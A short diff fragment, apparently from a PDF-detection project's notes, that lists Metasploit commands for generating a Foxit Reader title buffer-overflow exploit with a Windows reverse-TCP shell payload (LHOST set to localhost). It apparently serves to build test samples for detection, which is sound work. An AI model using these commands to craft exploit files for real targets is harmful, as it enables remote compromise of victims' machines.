@@ -20,3 +20,6 @@ This currently doesn't get caught, because I ignore all the pages that are alrea
 metasploit commands for making Foxit exploit:
 use exploit/windows/fileformat/foxit_title_bof
 set PAYLOAD windows/shell/reverse_tcp
+show options
+set LHOST 127.0.0.1
+exploit
